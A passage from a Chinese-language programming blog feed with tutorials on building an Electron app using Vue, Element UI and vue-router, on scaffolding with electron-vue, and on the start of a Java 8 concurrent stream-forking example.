class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sidebar&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-menu</span> <span class="attr">default-active</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">v-bind:to</span>=<span class="string">&quot;&#x27;/home&#x27;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">icon</span> <span class="attr">name</span>=<span class="string">&quot;home&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">icon</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>首页</span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">v-bind:to</span>=<span class="string">&quot;&#x27;/sysinfo&#x27;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">icon</span> <span class="attr">name</span>=<span class="string">&quot;car&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">icon</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>测试</span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-menu</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;page-frame&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.sidebar &#123;</span><br><span class="line"><span class="css">  <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="css">  <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">  <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">  <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">  <span class="attribute">background-color</span>: <span class="number">#eef1f6</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.content &#123;</span><br><span class="line"><span class="css">  <span class="attribute">margin-left</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">  <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="css">  <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">300px</span>);</span></span><br><span class="line"><span class="css">  <span class="attribute">min-height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="css">  <span class="attribute">background</span>: <span class="built_in">radial-gradient</span>( ellipse at top left,</span></span><br><span class="line">  rgba(255, 255, 255, 1) 40%,</span><br><span class="line">  rgba(229, 229, 229, .9) 100%);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原入口 <code>App.vue</code> 改为只渲染页面布局，即上面提到的内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">page-frame</span>&gt;</span><span class="tag">&lt;/<span class="name">page-frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> PageFrame <span class="keyword">from</span> <span class="string">&#x27;./components/PageFrame&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;markdown-yaml-info-manager&#x27;</span>,</span></span><br><span class="line">  components: &#123; PageFrame &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">.fa-icon &#123;</span><br><span class="line"><span class="css">  <span class="attribute">height</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="css">  <span class="attribute">width</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="css">  <span class="attribute">bottom</span>: -<span class="number">0.125em</span>;</span></span><br><span class="line"><span class="css">  <span class="attribute">position</span>: relative;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>别忘了定义一下vue-route，在 <code>route/index.js</code> 下，至于什么是vue-route，照着写就可以了。大体意思是，<code>/home</code> 载入原先的欢迎页，<code>/sysinfo</code> 输出一下系统信息，如果是其它的就跳转到 <code>/home</code>。这些配置信息可以配合 <code>&lt;router-link&gt;</code> 标签使用，用来转换 <code>&lt;route-view&gt;</code> 标签位置显示的内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Router)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">      name: <span class="string">&#x27;landing-page&#x27;</span>,</span><br><span class="line">      component: <span class="built_in">require</span>(<span class="string">&#x27;@/components/LandingPage&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">&#x27;/sysinfo&#x27;</span>,</span><br><span class="line">      name: <span class="string">&#x27;system-information&#x27;</span>,</span><br><span class="line">      component: <span class="built_in">require</span>(<span class="string">&#x27;@/components/LandingPage/SystemInformation&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">      redirect: <span class="string">&#x27;/home&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>其它的页面css和布局稍微调整一下，整个布局就ok了。最后效果页。</p><img src="/2017/06/19/start-from-the-very-beginning-for-electron-with-element-ui-and-icon/2.png" class="" title="效果页面"><h1 id="问题说明"><a class="markdownIt-Anchor" href="#问题说明"></a> 问题说明</h1><h2 id="图标与字体对其问题"><a class="markdownIt-Anchor" href="#图标与字体对其问题"></a> 图标与字体对其问题</h2><p>调整一下图标大小，微调一下位置，<a href="https://github.com/aleen42/PersonalWiki/blob/master/translation/align_svg/align_svg.md">参考</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.fa-icon</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: -<span class="number">0.125em</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="eslint问题"><a class="markdownIt-Anchor" href="#eslint问题"></a> eslint问题</h2><p>eslint会检查代码格式，所以平时要注意把格式化弄的跟eslint一样，不然每次格式化都会出错。</p><p>这里举个例子，通过配置 <code>.eslintrc.js</code> 可以控制检测的选项，比如下面的选项禁用了函数空格的检查，因为一直调不好</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;rules&#x27;: &#123;</span><br><span class="line">  &quot;space-before-function-paren&quot;: [&quot;error&quot;, &#123;</span><br><span class="line">      &quot;anonymous&quot;: &quot;never&quot;,</span><br><span class="line">      &quot;named&quot;: &quot;never&quot;,</span><br><span class="line">      &quot;asyncArrow&quot;: &quot;never&quot;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="template只能有一个根元素"><a class="markdownIt-Anchor" href="#template只能有一个根元素"></a> template只能有一个根元素</h2><p>vue的模板的根元素只能有一个根元素</p><blockquote><p>Component template should contain exactly one root element</p></blockquote><p>所以只能写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>abcde....</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而不能写成</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>abcde....<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="打包编译"><a class="markdownIt-Anchor" href="#打包编译"></a> 打包编译</h1><p>打包编译可以运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn run build</span><br></pre></td></tr></table></figure><p>只发现可以编译成exe文件，无法生成mac上的文件，后来发现在 electron-builder 的文档里发现了，编译只能生成本身平台的文件<a href="https://github.com/electron-userland/electron-builder/wiki/Multi-Platform-Build">Multi Platform Build</a></p><blockquote><p>Don’t expect that you can build app for all platforms on one platform.</p></blockquote><p>算了，其它平台到时候借个电脑编译一下吧。</p><h1 id="稍微总结一下"><a class="markdownIt-Anchor" href="#稍微总结一下"></a> 稍微总结一下</h1><p>了解了主要的项目结构，初步使用了vue-router相关内容，对于vue组件的编写也有了一定的了解。</p><p>不太了解的地方是store的内容，这部分还没有接触到。</p><p>然后代码可以上传了。<img class="emoji" draggable="false" alt="🌑" src="https://twemoji.maxcdn.com/2/72x72/1f311.png"/></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上一篇捣鼓了一个Electron-vue的脚手架，把Vue的全家桶搭建了一下，也很给面子的跑了起来。接下来就是如何一步一步完成我心中的那个“她”了。&lt;/p&gt;
&lt;p&gt;首先先巴拉巴拉自己的技能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Vue用过，了解Vue的MVVM思想，但是Vue2及其全</summary>
      
    
    
    
    <category term="体验Electron" scheme="https://sumygg.com/categories/%E4%BD%93%E9%AA%8CElectron/"/>
    
    
    <category term="electron" scheme="https://sumygg.com/tags/electron/"/>
    
    <category term="icon" scheme="https://sumygg.com/tags/icon/"/>
    
    <category term="vue" scheme="https://sumygg.com/tags/vue/"/>
    
    <category term="elementui" scheme="https://sumygg.com/tags/elementui/"/>
    
    <category term="vueawesome" scheme="https://sumygg.com/tags/vueawesome/"/>
    
  </entry>
  
  <entry>
    <title>使用electron-vue搭建脚手架</title>
    <link href="https://sumygg.com/2017/06/17/get-start-with-vue-and-electron/"/>
    <id>https://sumygg.com/2017/06/17/get-start-with-vue-and-electron/</id>
    <published>2017-06-17T15:51:25.000Z</published>
    <updated>2021-03-16T08:51:03.004Z</updated>
    
    <content type="html"><![CDATA[<p>是的，最近无聊，打算开个新坑，想用Electron做点东西。涉及前端的东西总是有好多选择，也就有好多组合。</p><p>使用Electron，可以使用原生的js写，也可以用babel加点新特性什么。听说可以用React，但是被我否决了，没有基础熟悉起来太麻烦。考虑最近用了Vue，决定尝试一些Vue2什么的。</p><p>查了一些资料，用<a href="https://github.com/SimulatedGREG/electron-vue">SimulatedGREG/electron-vue</a>可以作为初始的一个脚手架。</p><p>根据文档一步一步做下来就好：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Install vue-cli and scaffold boilerplate</span></span><br><span class="line">npm install -g vue-cli</span><br><span class="line">vue init simulatedgreg/electron-vue my-project</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Install dependencies and run your app</span></span><br><span class="line">cd my-project</span><br><span class="line">yarn # or npm install</span><br><span class="line">yarn run dev # or npm run dev</span><br></pre></td></tr></table></figure><p>没有 <code>yarn</code> 命令可以通过 <code>npm install yarn -g</code> 安装。</p><p>首先找目录创建一个项目，出现的信息随便选了选，也不知道这些工具都是干啥的。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ vue init simulatedgreg&#x2F;electron-vue markdown-yaml-info-manager</span><br><span class="line"></span><br><span class="line">? Application Name (markdown-yaml-info-manager)</span><br><span class="line">? Application Name markdown-yaml-info-manager</span><br><span class="line">? Project description (An electron-vue project)</span><br><span class="line">? Project description An electron-vue project</span><br><span class="line">? Select which Vue plugins to install (Press &lt;space&gt; to select)</span><br><span class="line">? Select which Vue plugins to install axios, vue-electron, vue-router, vuex</span><br><span class="line">? Use linting with ESLint? (Y&#x2F;n) y</span><br><span class="line">? Use linting with ESLint? Yes</span><br><span class="line">? Which eslint config would you like to use? (Use arrow keys)</span><br><span class="line">? Which eslint config would you like to use? Standard</span><br><span class="line">? Setup unit testing with Karma + Mocha? (Y&#x2F;n) n</span><br><span class="line">? Setup unit testing with Karma + Mocha? No</span><br><span class="line">? Setup end-to-end testing with Spectron + Mocha? (Y&#x2F;n) n</span><br><span class="line">? Setup end-to-end testing with Spectron + Mocha? No</span><br><span class="line">? What build tool would you like to use? (Use arrow keys)</span><br><span class="line">? What build tool would you like to use? builder</span><br><span class="line">? author (sumy &lt;sunmingjian8@gmail.com&gt;)</span><br><span class="line">? author sumy &lt;sunmingjian8@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">   vue-cli · Generated &quot;markdown-yaml-info-manager&quot;.</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">All set. Welcome to your new electron-vue project!</span><br><span class="line"></span><br><span class="line">Make sure to check out the documentation for this boilerplate at</span><br><span class="line">https:&#x2F;&#x2F;simulatedgreg.gitbooks.io&#x2F;electron-vue&#x2F;content&#x2F;.</span><br><span class="line"></span><br><span class="line">Next Steps:</span><br><span class="line"></span><br><span class="line">  $ cd markdown-yaml-info-manager</span><br><span class="line">  $ yarn (or &#96;npm install&#96;)</span><br><span class="line">  $ yarn run dev (or &#96;npm run dev&#96;)</span><br></pre></td></tr></table></figure><p>最后的步骤使用 <code>npm install</code> 的时候报错了，安装和使用 <code>yarn</code> 就没出现报错的问题。之后运行 <code>yarn</code> 和 <code>yarn run dev</code> 出来如下界面：</p><img src="/2017/06/17/get-start-with-vue-and-electron/1.png" class="" title="测试"><p>感觉还不错，也支持修改自动加载啥的。。。本来还想试试sass，结果不太懂，还是放弃吧，就这样开坑挺好的<img class="emoji" draggable="false" alt="😂" src="https://twemoji.maxcdn.com/2/72x72/1f602.png"/>。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;是的，最近无聊，打算开个新坑，想用Electron做点东西。涉及前端的东西总是有好多选择，也就有好多组合。&lt;/p&gt;
&lt;p&gt;使用Electron，可以使用原生的js写，也可以用babel加点新特性什么。听说可以用React，但是被我否决了，没有基础熟悉起来太麻烦。考虑最近用了</summary>
      
    
    
    
    <category term="体验Electron" scheme="https://sumygg.com/categories/%E4%BD%93%E9%AA%8CElectron/"/>
    
    
    <category term="electron" scheme="https://sumygg.com/tags/electron/"/>
    
    <category term="vue" scheme="https://sumygg.com/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>如何以并发方式在同一个流上执行多种操作</title>
    <link href="https://sumygg.com/2017/06/07/java8-stream-forker-consumer-framework/"/>
    <id>https://sumygg.com/2017/06/07/java8-stream-forker-consumer-framework/</id>
    <published>2017-06-07T07:00:58.000Z</published>
    <updated>2021-03-16T08:51:03.003Z</updated>
    
    <content type="html"><![CDATA[<p>最近看了《Java8实战》，了解了Java8 Stream的一些内容。在Java 8中，流的一个局限性在于，只能遍历一次，再次遍历的时候会出现异常：</p><blockquote><p>java.lang.IllegalStateException: stream has already been operated upon or closed</p></blockquote><p>对于这种情况，《Java8实战》附录C给出了一种实现方式，通过 <code>Spliterator</code> 结合 <code>BlockingQueues</code> 和 <code>Futures</code> 来实现这个功能。</p><h1 id="主要思想"><a class="markdownIt-Anchor" href="#主要思想"></a> 主要思想</h1><p>首先创建一个StreamForker类对当前需要被Fork的Stream进行包装，向StreamForker类中添加的操作由索引来标识，之后可以通过索引来取到该操作的结果。</p><img src="/2017/06/07/java8-stream-forker-consumer-framework/1.png" class="" title="StreamForker主要思想"><p>StreamForker会遍历每个操作，并创建相应的副本，并行的在复制流上执行这些操作，并将最终的结果整合到一个Map中。 <code>Results</code> 结果定义如下，可以用来获取执行操作的结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Results</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;R&gt; <span class="function">R <span class="title">get</span><span class="params">(Object key)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面，说明一下各个部分的实现。</p><h1 id="复制流"><a class="markdownIt-Anchor" href="#复制流"></a> 复制流</h1><p>当我们向StreamForker中添加了N个操作之后，就需要将Stream复制N份，复制N份的操作由 <code>ForkingStreamConsumer</code> 完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Future;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Consumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForkingStreamConsumer</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">Consumer</span>&lt;<span class="title">T</span>&gt;, <span class="title">Results</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Object END_OF_STREAM = <span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;BlockingQueue&lt;T&gt;&gt; queues;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;Object, Future&lt;?&gt;&gt; actions;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ForkingStreamConsumer</span><span class="params">(List&lt;BlockingQueue&lt;T&gt;&gt; queues, Map&lt;Object, Future&lt;?&gt;&gt; actions)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.queues = queues;</span><br><span class="line">        <span class="keyword">this</span>.actions = actions;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(T t)</span> </span>&#123;</span><br><span class="line">        queues.forEach(q -&gt; q.add(t));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">finish</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        accept((T) END_OF_STREAM);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R&gt; <span class="function">R <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ((Future&lt;R&gt;) actions.get(key)).get();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个类实现了Consumer接口和Reuslts接口，并持有queues和actions两个引用。</p><p>在这里，每当ForkingStreamConsumer接受流中的一个元素，它就会将该元素添加到所有队列，finish()方法会将最后一个哨兵元素添加到所有队列。</p><p>Results接口的get()方法会根据键值取到相应的Future来获取结果，解析并返回。</p><h1 id="应用操作"><a class="markdownIt-Anchor" href="#应用操作"></a> 应用操作</h1><p>ForkingStreamConsumer负责分发元素，还需要一个去处理BlockingQueue里的元素。这里使用 <code>Spliterator</code> 来完成这个而操作，通过 <code>StreamSupport.stream()</code> 和 <code>Spliterator</code> 的实现可以创建一个新的流。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Spliterator;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Consumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlockingQueueSpliterator</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">Spliterator</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> BlockingQueue&lt;T&gt; q;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BlockingQueueSpliterator</span><span class="params">(BlockingQueue&lt;T&gt; q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.q = q;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryAdvance</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> T&gt; action)</span> </span>&#123;</span><br><span class="line">        T t;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                t = q.take();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (t != ForkingStreamConsumer.END_OF_STREAM) &#123;</span><br><span class="line">            action.accept(t);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> 